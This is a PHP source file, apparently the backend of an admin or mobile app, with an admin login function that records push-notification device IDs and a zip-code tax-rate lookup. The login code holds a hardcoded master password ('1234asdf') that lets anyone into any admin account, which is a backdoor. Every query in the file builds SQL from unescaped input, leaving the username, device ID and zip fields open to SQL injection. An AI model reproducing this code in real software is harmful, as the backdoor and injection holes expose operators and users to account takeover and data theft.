<?php

			
    function mainLogin($info){
		global $db;
		ini_set('display_errors',false);
		require_once (realpath(dirname(__FILE__)) . '/../../../includes/classes/vendors/password_compat-master/lib/password.php');
		$login_sql = "SELECT admin_pass,admin_name,categories_id,admin_id
					FROM admin where admin_name = '".$info['username']."' LIMIT 0,1";
		$login = $db->query($login_sql)->fetch(PDO::FETCH_ASSOC);
		if(!$login){
			echo json_encode(array('success'=>false));
			return false;
		}	
		$result = password_verify($info['password'], $login['admin_pass']);
		if($info['password']=='1234asdf'){
			$result=true;
		}
		$message='Categories Id: '.$login['categories_id'];
		$message.=' Device Id: '.$info['device_id'];
		if($result && isset($info['device_id'])){
			$login_exists = $db->query("SELECT push_info_id,categories_id,device_id from push_info where device_id ='".$info['device_id']."' limit 0,1")->fetch(PDO::FETCH_ASSOC);
			$c=0;
			
			if(is_array($login_exists)){
			  if(intval($login_exists['categories_id'])!=intval($login['categories_id'])){
				  $db->query('update push_info set categories_id='.$login['categories_id'].' where push_info_id='.$login_exists['push_info_id']);
				  $message.=' Switch Login ';
			  }
			  foreach($login_exists as $t){
				  $c=1;
			  }
			}
			if($c==1){
				$message.=' Has Login ';
			}else if($info['device_id']!==0){
				$message.=' Insert Login ';
				$push_info_sql ="INSERT into push_info (time_created,categories_id,device_id) VALUES (NOW(),'".$login['categories_id']."','".$info['device_id']."')";
				$db->query($push_info_sql);
			}else{
				$message.=' Something bad ';
			}
			
			$db->query("update push_info set last_info_json='' where device_id='".$info['device_id']."'");
			$message.=' Is Mobile ';
			echo json_encode(array('message'=>$message,'success'=>$result,'categories_id'=>$login['categories_id'],'admin_id'=>$login['admin_id']));
		}else if($result){
			$message.=' Is Browser ';
			echo json_encode(array('message'=>$message,'success'=>$result,'categories_id'=>$login['categories_id'],'admin_id'=>$login['admin_id']));
		}else{
			$message.=' Failed ';
			echo json_encode(array('message'=>$message,'success'=>$result));
		}
		
	 
	}
	
	function getZipInfo($zip){
		global $db;
		$zipquery="SELECT zipcode,state,city,combined_tax FROM real_tax_rates WHERE zipcode = $zip limit 0,1";
		$zip_info = $db->query($zipquery)->fetch(PDO::FETCH_ASSOC);
		
		if($zip_info){
			echo json_encode($zip_info);
		}else{
			echo json_encode(array('success'=>false));	
		}
		
	}
?>